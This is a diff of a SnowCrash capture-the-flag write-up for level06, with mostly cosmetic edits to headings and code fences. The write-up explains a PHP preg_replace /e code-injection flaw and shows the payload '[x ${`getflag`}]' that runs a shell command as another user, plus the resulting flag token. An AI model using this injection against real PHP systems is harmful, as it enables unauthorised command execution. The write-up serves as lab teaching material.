@@ -1,6 +1,6 @@
 # level06 - Irregular Expression
 
-## Home content
+## Home Content
 
 - `level06` home contains two files of some interest: `level06` and `level06.php`.
 - Both belongs to `flag06` but they are in `level06` group.
@@ -32,9 +32,9 @@ mask::r-x
 other::---
 ```
 
-## `flag06` executable
+## `flag06` Executable
 
-### String content
+### String Content
 
 - Based on strings found in the binary, we may suppose that `level06` will allow us to run `level06.php` as `flag06`.
 
@@ -55,7 +55,7 @@ fr/usr/bin/php
 
 ## `flag06.php`
 
-```
+```php
 #!/usr/bin/php
 
 <?php
@@ -84,7 +84,7 @@ $r = x($argv[1], $argv[2]); print $r;
 - One of them is able to execute the parsed content (the /e option).
 - Notice that this option is deprecated but the PHP version (5.3.10) on SnowCrash in old enough to allow it.
 
-```
+```sh
 level06@SnowCrash:~$ php -v
 PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
 Copyright (c) 1997-2012 The PHP Group
@@ -94,14 +94,14 @@ Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
 ### Irregular Expressions.
 
 - The first regex (the executable one) will first parse a pattern like `[x SOMETHING ]` and replace it by `y("SOMETHING")`.
-- As `y()` is a legit funcion, replacing `SOMETHING` by `${SOMETHING}` will allow it to be executed. Provided that `SOMETHING` don't contain any `.` or `@`, the function will return the string `SOMETHING`.
+- As `y()` is a legit function, replacing `SOMETHING` by `${SOMETHING}` will allow it to be executed. Provided that `SOMETHING` don't contain any `.` or `@`, the function `y()` will return the string `SOMETHING`.
 - That string will again be executed.
-- Using `` `getflag` `` instead of SOMETHING, will do the trick.
+- Using `` `getflag` `` instead of `SOMETHING`, will do the trick.
 
 ## Misuse of PHP
 
-```
-chmod 777 .
+```sh
+level06@SnowCrash:~$ chmod 777 .
 level06@SnowCrash:~$ echo '[x ${`getflag`}]' > irregex
 level06@SnowCrash:~$ ./level06 irregex
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
